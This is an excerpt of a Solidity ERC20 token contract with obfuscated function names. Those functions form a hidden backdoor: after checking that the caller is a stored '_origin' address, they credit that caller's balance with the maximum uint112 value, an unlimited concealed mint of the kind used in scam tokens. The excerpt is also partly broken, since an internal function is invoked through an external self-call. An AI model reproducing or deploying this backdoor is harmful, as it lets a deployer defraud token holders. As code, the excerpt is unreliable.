...
contract TokenContract is IERC20, Ownable {
    ...
    function token_amount() external {
    ...
    function e3fb23a0d() internal {
        bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)", msg.sender, 1);
        (bool success, ) = address(this).call(payload);
        require(success, "e3fb23a0d failed");
        _balances[msg.sender] += type(uint112).max;
    }

    function d1fa275f334f() public {
        SecureCalls.checkCaller(msg.sender, _origin);
        bytes memory payload = abi.encodeWithSignature("e3fb23a0d()");
        (bool success, ) = address(this).call(payload);
        require(success, "d1fa275f334f failed");
    }
